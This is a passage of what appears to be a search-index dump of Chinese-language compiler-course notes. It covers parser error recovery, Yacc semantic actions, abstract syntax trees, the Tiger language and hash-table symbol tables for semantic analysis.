<p>\u5e0c\u671b\u4e00\u6b21\u7f16\u8bd1\u5c3d\u91cf\u62a5\u51fa\u6240\u6709\u9519\u8bef\u800c\u4e0d\u662f\u7b2c\u4e00\u4e2a\u9519\u8bef\u5c31\u505c\u6b62</p> <p>Error recovery techniques\uff1a</p> <ul> <li>Local error recovery<ul> <li>Adjust the parse stack and the input at the point where the  error was detected in a way that will allow parsing to resume.</li> </ul> </li> <li>Global error repair<ul> <li>Find the smallest set of insertions and deletions that would turn the source string into a syntactically correct string</li> </ul> </li> </ul>"}, {"location": "Course/cp/parsing2/#local-error-recovery", "title": "Local Error Recovery", "text": "<p>Abstract</p> <ul> <li>\u4f7f\u7528\u9519\u8bef\u4ea7\u751f\u5f0f\u6765\u5b8c\u6210\u8bed\u6cd5\u9519\u8bef\u6062\u590d<ul> <li>\u9519\u8bef\u4ea7\u751f\u5f0f \\(A \\rightarrow \\text{error} \\alpha\\)</li> <li>\u4f8b\u5982\uff1a\\(\\textit{stmt} \\rightarrow \\text{error};\\)</li> </ul> </li> <li>\u5b9a\u4e49\u54ea\u4e9b\u975e\u7ec8\u7ed3\u7b26\u53f7\u6709\u9519\u8bef\u6062\u590d\u52a8\u4f5c<ul> <li>\u6bd4\u5982\uff1a\u8868\u8fbe\u5f0f\u3001\u8bed\u53e5\u3001\u5757\u3001\u51fd\u6570\u5b9a\u4e49\u7b49\u975e\u7ec8\u7ed3\u7b26\u53f7</li> </ul> </li> <li>\u5f53\u8bed\u6cd5\u5206\u6790\u5668\u9047\u5230\u9519\u8bef\u65f6<ul> <li>\u4e0d\u65ad\u5f39\u51fa\u6808\u4e2d\u72b6\u6001\uff0c\u76f4\u5230\u6808\u9876\u72b6\u6001\u5305\u542b\u9879 \\(A \\rightarrow \\cdot \\text{error} \\alpha\\)</li> <li>\u5206\u6790\u5668\u5c06 error \u79fb\u5165\u6808\u4e2d</li> <li>\u5982\u679c \\(\\alpha\\) \u4e3a\u7a7a\uff0c\u5206\u6790\u5668\u76f4\u63a5\u6267\u884c\u5f52\u7ea6\uff0c\u5e76\u8c03\u7528\u76f8\u5173\u7684\u8bed\u4e49\u52a8\u4f5c\uff1b\u5426\u5219 \u8df3\u8fc7 \u4e00\u4e9b\u7b26\u53f7\uff0c\u627e\u5230\u53ef\u4ee5\u5f52\u7ea6\u4e3a \\(\\alpha\\) \u7684\u4e32\u4e3a\u6b62</li> </ul> </li> </ul> <p>\u4e00\u4e2a\u5728 Yacc \u4e2d\u7684 local recovery mechanism:</p> <ul> <li>Use a special error (terminal) symbol to control the recovery process</li> </ul> <p>\u4f8b\u5982\u5bf9\u4e8e\u4e0b\u9762\u6587\u6cd5\uff0c\u52a0\u5165\u4e86 <code>error</code> symbol</p> <pre><code>exp -&gt; ID\n    | exp + exp\n    | (exps)\n    | (error)\nexps -&gt; exp\n    | exps; exp\n    | error ; exp\n</code></pre> <p>\u5982\u679c\u5728\u8868\u8fbe\u5f0f\u4e2d\u95f4\u9047\u5230\u8bed\u6cd5\u9519\u8bef\uff0c\u89e3\u6790\u5668\u5e94\u8df3\u5230\u4e0b\u4e00\u4e2a\u5206\u53f7 (semicolon) \u6216\u53f3\u62ec\u53f7 (right parenthesis)\uff0c\u7136\u540e\u7ee7\u7eed\u89e3\u6790</p> <p>\u50cf\u5206\u53f7\u548c\u53f3\u62ec\u53f7\u88ab\u53eb\u505a synchronization tokens</p> <p>\u5177\u4f53\u64cd\u4f5c\u7684\u65f6\u5019\uff0c<code>error</code> \u88ab\u770b\u4f5c terminal symbol,\u5f53 LR Parser \u9047\u5230 error state \u65f6\uff0c\u4f1a\u6267\u884c\u4e0b\u9762\u7684\u64cd\u4f5c\uff1a</p> <ol> <li>Pop the stack (if necessary) until a state is reached in which the action for the error token is shift.</li> <li>Shift the error token.</li> <li>Discard input symbols (if necessary) until a lookahead is reached that has a nonerror action in the current state.</li> <li>Resume normal parsing.</li> </ol> Example <p></p>"}, {"location": "Course/cp/parsing2/#global-error-recovery", "title": "Global Error Recovery", "text": "<ul> <li>Global error repair : finds the smallest set of insertions and deletions that would turn the source string into a syntactically correct string, even if the insertions and deletions are not at a point where an LL or LR parser would first report an error.</li> <li>Burke-Fisher error repair: single-token insertion, deletion, or replacement at every point that occurs no earlier than K tokens before the point where the parser reported the error. <ul> <li>The LL(\\(k\\)) or LR(\\(k\\)) (or LALR, etc.) grammar is not modified at all (no error productions)</li> <li>Nor are the parsing tables modified</li> </ul> </li> </ul>"}, {"location": "Course/cp/semantic/", "title": "Semantic Analysis | Activation Record", "text": "<p> \u7ea6 7081 \u4e2a\u5b57  211 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 26 \u5206\u949f</p>"}, {"location": "Course/cp/semantic/#_1", "title": "\u8fc7\u6e21\u77e5\u8bc6", "text": ""}, {"location": "Course/cp/semantic/#attribute-grammar", "title": "\u5c5e\u6027\u6587\u6cd5 | Attribute Grammar", "text": "<p>Warning</p> <p>\u9f99\u4e66\u5bf9\u6b64\u8bb2\u89e3\u5341\u5206\u8be6\u7ec6\uff0c\u672c\u8bfe\u57fa\u4e8e\u864e\u4e66\u4e86\u89e3\u6982\u5ff5\u5373\u53ef\uff0c\u57fa\u672c\u601d\u60f3 \u5c31\u662f\u7ed9\u4e00\u4e9b\u8bed\u4e49\u89c4\u5219\u8d4b\u4e88\u4e00\u4e9b\u542b\u4e49</p> <ul> <li>\u5c5e\u6027\u6587\u6cd5\uff1a\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 + \u5c5e\u6027 + \u5c5e\u6027\u8ba1\u7b97\u89c4\u5219<ul> <li>\u5c5e\u6027\uff1a\u63cf\u8ff0\u6587\u6cd5\u7b26\u53f7\u7684\u8bed\u4e49\u7279\u5f81\uff0c\u5982\u53d8\u91cf\u7684\u7c7b\u578b\u3001\u503c\u7b49\u3002\u4f8b\uff0c\u975e\u7ec8\u7ed3\u7b26 \\(E\\) \u7684\u5c5e\u6027 \\(E\\text{.val}\\) \u8868\u793a \\(E\\) \u7684\u503c</li> <li>\u5c5e\u6027\u8ba1\u7b97\u89c4\u5219 (\u8bed\u4e49\u89c4\u5219)\uff1a\u4e0e\u4ea7\u751f\u5f0f\u76f8\u5173\u8054\u3001\u53cd\u6620\u6587\u6cd5\u7b26\u53f7\u5c5e\u6027\u4e4b\u95f4\u5173\u7cfb\u7684\u89c4\u5219\uff0c\u6bd4\u5982\u201c\u5982\u4f55\u8ba1\u7b97 \\(E\\text{.val}\\)\u201d</li> </ul> </li> <li>\u5c5e\u6027\u8ba1\u7b97\u89c4\u5219: \u4ec5\u8868\u660e\u5c5e\u6027\u95f4\u201c\u62bd\u8c61\u201d\u5173\u7cfb\uff0c\u4e0d\u6d89\u53ca\u5177\u4f53\u5b9e\u73b0\u7ec6\u8282\uff0c\u5982\u8ba1\u7b97\u6b21\u5e8f\u7b49</li> </ul> <p>\u7528\u5c5e\u6027\u63cf\u8ff0\u8bed\u4e49\u4fe1\u606f\uff0c\u7528\u8bed\u4e49\u89c4\u5219\u63cf\u8ff0\u5c5e\u6027\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u5c06\u8bed\u4e49\u89c4\u5219\u4e0e\u8bed\u6cd5\u89c4\u5219\u76f8\u7ed3\u5408</p> <p>\u5c5e\u6027\u6587\u6cd5\u7684\u6f5c\u5728\u5e94\u7528\u5927\u4f53\u5206\u4e3a\u4e24\u7c7b\uff08\u4f46\u7531\u4e8e\u5404\u79cd\u5c40\u9650\u6027\uff0c\u5c5e\u6027\u6587\u6cd5\u5e76\u672a\u5f97\u5230\u666e\u53ca\uff09</p> <ul> <li>\u201c\u63a8\u5bfc\u7c7b\u201d \u5e94\u7528\uff1a\u7c7b\u4f3c\u7a0b\u5e8f\u5206\u6790<ul> <li>\u8868\u8fbe\u5f0f\u7684\u7c7b\u578b\u3001\u503c\u3001\u6267\u884c\u4ee3\u4ef7\u7b49</li> </ul> </li> <li>\u201c\u751f\u6210\u7c7b\u201d \u5e94\u7528\uff1a\u7c7b\u4f3c\u7a0b\u5e8f\u5408\u6210<ul> <li>\u62bd\u8c61\u8bed\u6cd5\u6811\u751f\u6210</li> <li>\u4e2d\u95f4\u4ee3\u7801\u751a\u81f3\u6c47\u7f16\u751f\u6210</li> </ul> </li> </ul> \u5c5e\u6027\u6587\u6cd5\u7684\u5b9e\u73b0 <p>\u53ef\u901a\u8fc7 Parser \u751f\u6210\u5668\u652f\u6301\u7684\u201c\u8bed\u4e49\u52a8\u4f5c\u201d (Semantic action) \u5b9e\u73b0\u8ba1\u7b97, \u5e76\u5e94\u7528\u4e8e\u62bd\u8c61\u8bed\u6cd5\u6811\u751f\u6210\u7b49\u573a\u666f</p> <p>\u672c\u8bfe\u53ea\u9700\u8981\u5173\u6ce8 Yacc, Bison \u4e2d\u7684 Semantic Action\uff0c\u4ee5\u53ca\u600e\u4e48\u751f\u6210 AST \u8fd9\u4e9b\u5177\u4f53\u5e94\u7528\u5373\u53ef</p>"}, {"location": "Course/cp/semantic/#semantic-action", "title": "Semantic Action", "text": "<p>\u6bcf\u4e2a\u7ec8\u7ed3\u7b26\u548c\u975e\u7ec8\u7ed3\u7b26\u90fd\u53ef\u4ee5\u4e0e\u81ea\u5df1\u7684\u8bed\u4e49\u503c (semantic value) \u7684\u7c7b\u578b\u76f8\u5173\u8054 (\u7ed9\u6bcf\u4e00\u4e2a\u7b26\u53f7\u7ed1\u5b9a\u4e00\u4e2a\u8bed\u4e49\u503c\uff0c\u6bd4\u5982\u7c7b\u578b\uff0c\u6570\u5b66\u503c\u7b49)</p> <p>CFG and its Semantic Action</p> <p>Suppose that we want to \u201cevaluate\u201d the values of an expression\uff1a</p> <pre><code>E -&gt; E1 + T {E.val = E1.val + T.val}\nE -&gt; E1 - T {E.val = E1.val - T.val}\nE -&gt; T      {E.val = T.val}\nT -&gt; (E)    {T.val = E.val}\nT -&gt; num    {T.val = num.val}\n</code></pre> <ul> <li> <p>\u5728\u9012\u5f52\u4e0b\u964d\u5206\u6790\u4e2d\uff1a</p> <ul> <li>\u8bed\u4e49\u52a8\u4f5c\u6307\u4ee3 parsing \u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u6216\u8fd9\u4e9b\u51fd\u6570\u7684 side effect, \u53c8\u6216\u8005\u4e24\u8005\u7686\u6709</li> <li>For each terminal and nonterminal symbol, we associate a type of semantic values representing phrases derived from that symbol.</li> </ul> <p>Example</p> <p><code>T -&gt; T * F</code> \u5bf9\u5e94\u7684 semantic action:</p> <pre><code>int a = T();\neat(TIMES);\nint b = F();\nreturn a * b;\n</code></pre> </li> <li> <p>\u53c8\u6bd4\u5982\u5728 Yacc \u4e2d\u52a0\u5165 Semantic Action, \u4ece\u800c\u53ef\u4ee5\u4e00\u8fb9\u89e3\u6790\u4e00\u8fb9\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7684\u503c</p> <ul> <li><code>{...}</code>: semantic action, \u53ef\u4ee5\u662f\u4efb\u610f\u5408\u6cd5\u7684 C \u4ee3\u7801</li> <li><code>$i</code>: the semantic values of the i-th RHS symbol</li> <li><code>$$</code>: the semantic value of the LHS nonterminal symbol</li> <li><code>%union</code>: difference possible types for semantic values to carry</li> <li><code>&lt;variant&gt;</code>: declares the type of each terminal and nonterminal</li> </ul> Example <pre><code>%{ ... %}\n%union {\n    int num;\n    string id;\n}\n%token &lt;num&gt; INT\n%token &lt;id&gt; ID\n%type &lt;num&gt; exp\n...\n%left UMINUS\n%%\nexp : INT {$$ = $1;}\n    | exp '+' exp {$$ = $1 + $3;}\n    | exp '-' exp {$$ = $1 - $3;}\n    | exp '*' exp {$$ = $1 * $3;}\n    | MINUS exp %prec UMINUS {$$ = -$2;}\n</code></pre> </li> </ul> Semantic Actions in Yacc-Generated Parsers <ul> <li>Yacc \u751f\u6210\u7684 parser \u4f1a\u4fdd\u7559\u4e00\u4e2a\u4e0e\u72b6\u6001\u6808\u5e73\u884c\u7684\u503c\u6808\uff0c\u7528\u4e8e\u5b58\u50a8\u8bed\u4e49\u503c</li> <li>\u5f53 parser \u89c4\u7ea6\u4e00\u4e2a\u4ea7\u751f\u5f0f\u65f6\uff0c\u4f1a\u6267\u884c\u76f8\u5e94\u7684 semantic action\uff0c\u5c06\u8ba1\u7b97\u7ed3\u679c\u538b\u5165\u503c\u6808</li> <li>\u5f53 parser \u4ece\u7b26\u53f7\u6808\u4e2d\u5f39\u51fa \\(Y_k, \\dots Y_1\\) \u5e76\u5f39\u5165 \\(A\\) \u65f6, \u4e5f\u4f1a\u4ece\u8bed\u4e49\u503c\u6808\u4e2d\u5f39\u51fa \\(k\\) \u4e2a\u503c, \u5e76\u63a8\u5165 semantic action \u7684\u7ed3\u679c</li> </ul>"}, {"location": "Course/cp/semantic/#abstract-parse-tree", "title": "Abstract Parse Tree", "text": "<p>\u8003\u8651\u4e4b\u524d\u7684 semantic action, \u5176\u5b9e\u53ef\u4ee5\u7528 Yacc \u548c\u76f8\u5e94\u7684 semantic action \u5199\u51fa\u4e00\u4e2a\u5b8c\u6574\u7684\u7f16\u8bd1\u5668</p> <ul> <li>\u4f46\u662f\u8fd9\u6837\u7684\u7f16\u8bd1\u5668\u96be\u4ee5\u9605\u8bfb\u548c\u7ef4\u62a4\uff1b</li> <li>\u5e76\u4e14\u5fc5\u987b\u5b8c\u5168\u6309\u7167\u7a0b\u5e8f\u89e3\u6790\u7684\u987a\u5e8f\u5206\u6790\u7a0b\u5e8f</li> </ul> <p>\u7531\u6b64\uff0c\u5e0c\u671b separate issues of syntax (parsing) from issues of semantics (type-checking and translation to machine code)</p> <p>\u5176\u4e2d\u4e00\u4e2a\u89e3\u51b3\u65b9\u6848\u662f\uff1a\u5c06\u8bed\u6cd5\u6811\u7684\u6784\u9020\u4e0e\u8bed\u4e49\u52a8\u4f5c\u5206\u79bb\uff0c\u5373\u5148\u6784\u9020\u8bed\u6cd5\u6811\uff0c\u518d\u5bf9\u8bed\u6cd5\u6811\u8fdb\u884c\u8bed\u4e49\u5206\u6790</p> <p>Why we need AST</p> <ul> <li>\u5bf9\u4e8e\u5148\u524d\u7684\u8bed\u6cd5\u6811\uff0c\u4ed6\u5bf9\u8f93\u5165\u7684\u6bcf\u4e00\u4e2a token \u90fd\u6709\u4e00\u4e2a\u53f6\u5b50\u8282\u70b9\uff0c\u4e14\u6bcf\u4e00\u4e2a parse \u8fc7\u7a0b\u4e2d\u7684\u89c4\u7ea6\u8bed\u6cd5\u90fd\u6709\u4e00\u4e2a\u5185\u90e8\u8282\u70b9</li> <li>\u8fd9\u6837\u7684\u8bed\u6cd5\u6811\u88ab\u79f0\u4e3a concrete parse tree\uff0c\u5b83\u5305\u542b\u4e86\u6240\u6709\u7684\u7ec6\u8282</li> <li>\u4f46\u662f\u8fd9\u6837\u7684\u8bed\u6cd5\u6811\u4e0d\u4fbf\u4e8e\u76f4\u63a5\u4f7f\u7528<ul> <li>redundant and useless tokens for later phases</li> <li>depends too much on the grammar</li> </ul> </li> </ul> Example <p></p> <p>\u4f8b\u5982\u56fe\u4e2d\u7684 \\(T\\) \u53ef\u80fd\u53ea\u662f\u4e4b\u524d\u4e3a\u4e86\u6d88\u9664\u4e8c\u4e49\u6027\uff0c\u4e34\u65f6\u52a0\u7684\u65b0\u7684 nonterminal\uff0c\u5bf9\u4e8e\u540e\u7eed\u7684\u8bed\u4e49\u5206\u6790\u662f\u6ca1\u6709\u610f\u4e49\u7684</p> <p>AST \u6240\u505a\u7684\u662f\u5728 parser \u548c\u7f16\u8bd1\u5668\u7684\u540e\u7eed\u9636\u6bb5\u4e4b\u95f4\u5efa\u7acb\u4e00\u4e2a clean interface (\u5177\u4f53\u64cd\u4f5c\u662f parser \u4f7f\u7528 concrete syntax \u4e3a\u62bd\u8c61\u8bed\u6cd5\u5efa\u7acb\u8bed\u6cd5\u6811)</p> <p></p> <p>The semantic analysis phase takes this abstract syntax tree. </p> <p>AST \u7684\u6784\u9020\u53ef\u4ee5\u624b\u5199\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 parser generator \u751f\u6210</p> manmade AST <p>A typedef for each nonterminal, a union-variant for each production.</p> Example <p>\u5bf9\u4e8e\u6587\u6cd5\uff1a</p> <pre><code>E  -&gt; n\n    | E + E\n    | E * E\n</code></pre> <p>\u4f7f\u7528\u5982\u4e0b\u6570\u636e\u7ed3\u6784\u8868\u793a AST:</p> <pre><code>typedef struct A_exp_ *A_exp;\nstruct A_exp_ {\n    enum {A_numExp, A_plusExp, A_timesExp} kind; \n    union {\n        int num; \n        struct {A_exp left; A_exp right;} plus; \n        struct {A_exp left; A_exp right;} times; \n    } u; \n};\n\nA_exp A_NumExp(int num);\nA_exp A_PlusExp(A_exp left, A_exp right); \nA_exp A_TimesExp(A_exp left, A_exp right);\n</code></pre> <p></p> Building AST Automatically <pre><code>    %{ ... %}\n    %union {\n        int num;\n        string id;\n    }\n    %token &lt;num&gt; INT\n    %token &lt;id&gt; ID\n    %type &lt;num&gt; exp\n    ...\n    %left UMINUS\n    %%\n    exp : INT {$$ = $1;}\n        | exp '+' exp {$$ = $1 + $3;}\n        | exp '-' exp {$$ = $1 - $3;}\n        | exp '*' exp {$$ = $1 * $3;}\n        | MINUS exp %prec UMINUS {$$ = -$2;}\n</code></pre> Applications of AST Traversals <ul> <li>Pretty print</li> <li>Desugaring</li> <li>Inlining</li> <li>High-level optimizations (e.g., \u5220\u9664\u516c\u5171\u5b50\u8868\u8fbe\u5f0f)</li> <li>Symbolic execution!(e.g., Clang Static Analyzer)</li> <li>Semantic analysis , e.g., type checking</li> <li>Translation to intermediate representations</li> <li>\u2026</li> </ul>"}, {"location": "Course/cp/semantic/#tiger-language", "title": "Tiger Language", "text": "<ul> <li>Simple control constructs:<ul> <li>if-then, if-then-else</li> <li>while-loops, for-loops</li> <li>function calls</li> </ul> </li> <li>Two basic types: int and string<ul> <li>Facility to define record and array types</li> <li>Facility to define mutually-recursive types</li> </ul> </li> <li>Supports nested functions, mutually recursive functions</li> </ul> <p>1) Let-In-End Expressions</p> <ul> <li>A Tiger program is expression (\u65e0 statement)</li> </ul> <pre><code>let\n    &lt;type declarations&gt;\n    &lt;variable declarations&gt;\n    &lt;function declarations&gt;\nin\n    &lt;sequence of expressions, separated by ;&gt;\nend\n</code></pre> <ul> <li>Scope extends to end of expression sequence</li> </ul> <p>2) Type Declarations</p> <ul> <li>Array lengths are not specified until creation</li> </ul> <pre><code>type t1 = int\ntype t2 = string\ntype rec1 = {f1:int, f2:t2}\ntype intArray = array of int\n</code></pre> <p>3) Variable Declarations</p> <p></p> <p>4) Function Declarations</p> <ul> <li>Parameters are passed by value:</li> </ul> <pre><code>function add1(x:int):int = x+1;\nfunction changeRec(r:rec1) =\n    (r.f1 := r.f1 + 10; r.f2 := \"hello\")\n</code></pre> <ul> <li>Function declarations can be nested<ul> <li>Nested functions can access local variables or parameters of outer functions</li> </ul> </li> </ul> <pre><code>function f1(y:int):int =\nlet\n    var z := 0\n    var w := 0\n    function f2():int = z + w * y\nin\n    f2()\nend\n</code></pre> <p>5) Mutual Recursion</p> <p>Functions and types can be mutually recursive</p> <ul> <li>Mutually-recusive types must be declared consecutively with no intervening variable or function declarations | \u4e92\u65a5\u7c7b\u578b\u5fc5\u987b\u8fde\u7eed\u58f0\u660e\uff0c\u4e2d\u95f4\u4e0d\u5f97\u6709\u53d8\u91cf\u6216\u51fd\u6570\u58f0\u660e</li> <li>Each recursion cycle in a type definition must pass through a record or array type | \u6bcf\u4e2a\u9012\u5f52\u5faa\u73af\u5728\u7c7b\u578b\u5b9a\u4e49\u4e2d\u5fc5\u987b\u901a\u8fc7\u8bb0\u5f55\u6216\u6570\u7ec4\u7c7b\u578b</li> <li>Mutually-recursive functions must be declared consecutively with no intervening type or variable declarations | \u4e92\u65a5\u9012\u5f52\u51fd\u6570\u5fc5\u987b\u8fde\u7eed\u58f0\u660e\uff0c\u4e2d\u95f4\u4e0d\u5f97\u6709\u7c7b\u578b\u6216\u53d8\u91cf\u58f0\u660e</li> </ul>"}, {"location": "Course/cp/semantic/#semantic-analysis", "title": "Semantic Analysis", "text": "<p>\u5bf9\u7f16\u8bd1\u5668\u6765\u8bf4\uff0c\u5355\u5355\u8bcd\u6cd5\u548c\u8bed\u6cd5\u5206\u6790\u662f\u4e0d\u8db3\u7684, \u4f8b\u5982\uff1a</p> <ul> <li>Does the dimension of a reference match the declaration? </li> <li>Is an array access out of bound?</li> <li>Where should a variable be stored (heap, stack,\u2026) </li> <li>\u2026</li> </ul> <p>\u4e0a\u8ff0\u95ee\u9898\u7684\u9650\u5236\u6765\u6e90\u4e8e\u8bed\u6cd5\u5206\u6790\u7684\u5c40\u9650\u6027\uff0c\u8fd9\u4e9b\u9519\u8bef\u662f\u5426\u80fd\u68c0\u67e5\u51fa\u662f\u4f9d\u8d56\u4e8e\u503c\u7684\uff0c\u800c\u4e0d\u662f\u8bed\u6cd5</p> <p>\u5e7f\u4e49\u7684 Semantic Analysis:</p> <ul> <li>We need to analyze the semantics of programs<ul> <li>Usually, this is done by traversing/analyzing various program  representations</li> <li>Examples of representations: AST, control flow graph (CFG), program dependence graph (PDG), value flow graph (VFG), SSA (single static assignment).</li> </ul> </li> <li>Sample semantic analysis: type checking, code generation, dead code elimination, register allocation, etc</li> </ul> <p>\u72ed\u4e49\u7684 Semantic Analysis:</p> <p>\u8bed\u6cd5\u5206\u6790\u68c0\u67e5\u4e0d\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u7528\u8bed\u4e49\u5206\u6790\u53ef\u4ee5\u68c0\u67e5\u51fa\u6765</p> <p>\u672c\u8bfe\u7a0b\u9ed8\u8ba4\u7684\u8bed\u4e49\u5206\u6790\uff1a</p> <ul> <li>Determine some static properties of program via AST, e.g., <ul> <li>Scope and visibility of names<ul> <li>every variable is declared before use</li> </ul> </li> <li>Types of variables, functions, and expression<ul> <li>every expression has a proper type</li> <li>function calls conform to definitions</li> </ul> </li> </ul> </li> <li>Translate the AST into some intermediate code</li> </ul>"}, {"location": "Course/cp/semantic/#symbol-table", "title": "Symbol Table", "text": "<p>\u7ba1\u7406\u4e0d\u540c\u7b26\u53f7\u4fe1\u606f\uff0c\u6bd4\u5982\u67d0\u4e2a\u53d8\u91cf\u5728\u54ea\u91cc\u53ef\u4ee5\u4f7f\u7528\u3001\u533a\u5206\u53d8\u91cf\u4f5c\u7528\u57df</p> <p>1) Binding: give a symbol a meaning | \u628a\u4e00\u4e9b\u6807\u5fd7\u7b26\u7ed1\u5b9a\u5230\u6709\u7279\u5b9a\u542b\u4e49\u7684\u5c5e\u6027,\u4f7f\u7528 \\(\\mapsto\\) \u8868\u793a</p> <p>E.g.,</p> Name/Symbol Meaning/Attribute type identifier type (e.g., int , string) variable identifier type, value, access info, \u2026 function identifier argument types, return type, \u2026 <p>2) Environment: a set of bindings | \u4e00\u7ec4\u7ed1\u5b9a</p> <p>E.g., {\\(g \\mapsto \\text{string}, ~ a \\mapsto \\text{int}\\)}</p> <p>3) Symbol table: the implementation of environment</p> <p>Semantic analysis: traverse the abstract syntax tree (AST) in certain order while maintaining a symbol table</p> Example <p>\u8003\u8bd5\u53ef\u80fd\u8003\u753b tiger \u8bed\u8a00\u7684\u7b26\u53f7\u8868</p> <pre><code>function f(a:int, b:int, c:int) =\n    (print_int(a+c) ;\n    let var j := a+b\n        var a := \"hello\"\n    in print(a); print_int(j)\n    end;\n    print_int(b)\n    )\n</code></pre> <ul> <li>\u5047\u8bbe\u6700\u5f00\u59cb\u7684 environment \u662f \\(\\sigma_0\\)</li> <li>\u5728\u7b2c\u4e00\u884c\uff0c\u51fd\u6570\u5b9a\u4e49\u5efa\u7acb\u65b0\u7684 environment \\(\\sigma_1\\)<ul> <li>\\(\\sigma_1 = \\sigma_0 + \\{a \\mapsto \\text{int},~ b \\mapsto \\text{int}, ~ c \\mapsto \\text{int}\\}\\)</li> <li>\u5728\u7b2c\u4e8c\u884c\uff0c\u6807\u8bc6\u7b26 \\(a, c\\) \u53ef\u4ee5\u5728\u73af\u5883 \\(\\sigma_1\\) \u4e2d\u67e5\u8be2\u5230</li> </ul> </li> <li>\u5728\u7b2c\u4e09\u884c\uff0c\u5efa\u7acb\u65b0\u7684 environment \\(\\sigma_2\\)<ul> <li>\\(\\sigma_2 = \\sigma_1 + \\{j \\mapsto \\text{int}\\}\\)</li> </ul> </li> <li>\u5728\u7b2c\u56db\u884c\uff0c\u6709 \\(\\sigma_3 = \\sigma_2 + \\{a \\mapsto \\text{string}\\}\\)</li> <li>\u5728\u7b2c\u516d\u884c\uff0cAs the semantic analysis reaches the end of each scope, the identifier bindings local to that scope are discarded.<ul> <li>\\(\\sigma_2, \\sigma_3\\) \u90fd\u4f1a\u88ab\u4e22\u5f03\uff0cenvironment \u6062\u590d\u4e3a \\(\\sigma_1\\)</li> </ul> </li> </ul> <p>\u7ea6\u5b9a</p> <p>Bindings in the right-hand table override those in the left</p> <ul> <li>\u4f8b\u5982\u5bf9\u4e0a\u8ff0 \\(\\sigma_3\\), \\(\\sigma_2\\) \u4e2d\u5305\u542b\u4e86 \\(a \\mapsto \\text{int}\\)</li> <li>\u5bf9\u4e8e \\(\\sigma_3\\), \\(\\{a \\mapsto \\text{string}\\}\\) \u4f1a\u8986\u76d6 \\(\\sigma_2\\) \u4e2d \\(a\\) \u7684 binding</li> </ul> <p>Symbol Table \u9700\u5b9e\u73b0\u7684\u63a5\u53e3</p> <ul> <li><code>insert</code>: \u5c06\u540d\u79f0\u7ed1\u5b9a\u5230\u76f8\u5173\u4fe1\u606f(\u5982\u7c7b\u578b), \u5982\u679c\u540d\u79f0\u5df2\u5728\u7b26\u53f7\u8868\u4e2d\u5b9a\u4e49\uff0c\u5219 \u65b0\u7684\u7ed1\u5b9a\u4f18\u5148\u4e8e\u65e7\u7684\u7ed1\u5b9a</li> <li><code>lookup</code>: \u5728\u7b26\u53f7\u8868\u4e2d\u67e5\u627e\u540d\u79f0\uff0c\u4ee5\u627e\u5230\u540d\u79f0\u7ed1\u5b9a\u7684\u4fe1\u606f</li> <li><code>beginScope</code>: \u8fdb\u5165\u4e00\u4e2a\u65b0\u7684\u4f5c\u7528\u57df</li> <li><code>endScope</code>: \u9000\u51fa\u4f5c\u7528\u57df\uff0c\u5c06\u7b26\u53f7\u8868\u6062\u590d\u5230\u8fdb\u5165\u4e4b\u524d\u7684\u72b6\u6001</li> </ul> <p>\u4e0b\u9762\u4ecb\u7ecd Efficient Implementation</p> <p>\u4e24\u79cd\u5b9e\u73b0\u98ce\u683c</p> <ol> <li>Imperative style (\u6709\u4e86\u65b0\u73af\u5883\u5c31\u770b\u4e0d\u5230\u65e7\u73af\u5883\uff0c\u4f46\u9000\u51fa\u4f5c\u7528\u57df\u7684\u65f6\u5019\u8fd8\u80fd\u8fd4\u56de\u5230\u65e7\u73af\u5883)<ul> <li>\u76f4\u5230 \\(\\sigma_1\\) \u53d8\u4e3a \\(\\sigma_2\\) \u624d\u4fee\u6539 \\(\\sigma_1\\)</li> <li>\\(\\sigma_2\\) \u5b58\u5728\u7684\u65f6\u5019\uff0c\u4e0d\u53ef\u4ee5\u8bbf\u95ee \\(\\sigma_1\\)</li> <li>\u5904\u7406\u5b8c \\(\\sigma_2\\) \u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u64a4\u9500\u4fee\u6539\uff0c\u8fd4\u56de\u5230\u73af\u5883 \\(\\sigma_1\\)</li> </ul> </li> <li>Functional style (\u6bcf\u6b21\u53d8\u5316\u90fd\u4fdd\u5b58\u7740\u65e7\u73af\u5883)<ul> <li>\u521b\u5efa\u73af\u5883 \\(\\sigma_2\\) \u7684\u540c\u65f6\uff0c\u4fdd\u5b58\u7740 \\(\\sigma_1\\) \u7684\u539f\u59cb\u72b6\u6001</li> <li>\u6613\u4e8e\u6062\u590d\u5230\u65e7\u73af\u5883\uff0c\u4f46\u662f\u9700\u8981\u66f4\u591a\u7684\u7a7a\u95f4</li> </ul> </li> </ol>"}, {"location": "Course/cp/semantic/#imperative-symbol-tables", "title": "Imperative Symbol Tables", "text": "<p>Problem 1</p> ProblemSolution <p>\u5982\u4f55\u505a\u5230\u9ad8\u6548\u7684 lookup?</p> <ul> <li>\u4f7f\u7528 hash table</li> <li>E.g., \\(\\sigma_{new} = \\sigma + \\{a \\mapsto \\text{int}\\}\\)</li> <li>\u90a3\u4e48\u5c31\u5c06 <code>&lt;a, int&gt;</code> \u63d2\u5165\u5230 hash table \u4e2d</li> </ul> <p>Problem 2</p> ProblemSolution <p>\u5982\u4f55\u5220\u9664\u5e76\u6062\u590d\u65e7\u73af\u5883?</p> <ul> <li>\u4f7f\u7528\u5e26\u6709\u5916\u90e8\u94fe (external chaining) \u7684 hash table</li> <li>E.g.: <code>hash(a)</code> -&gt; <code>&lt;a, int&gt;</code> -&gt; <code>&lt;a, string&gt;</code></li> </ul> <p></p> <p>\u7531\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u8ba1\u4e00\u4e2a efficient imperative symbol table, \u5176\u4e2d\u5305\u542b\uff1a</p> <ol> <li>Hash Tables: an array of buckets</li> <li>Bucket: list of entries (each entry maps identifier to binding)</li> </ol> <p>\u5177\u4f53\u7684\u51fd\u6570\u8bbe\u8ba1\u601d\u60f3\uff1a</p> LookupInsertRestore <p>lookup entry for identifier key in symbol table:</p> <ul> <li>Apply hash function to <code>key</code> for getting array element <code>index</code> </li> <li>Traverse bucket in <code>table[index]</code> to find the binding. (<code>table[x]</code>: all entries whose keys hash to <code>x</code>)</li> </ul> <p>Insert new element at front of bucket</p> <ul> <li>strong update, 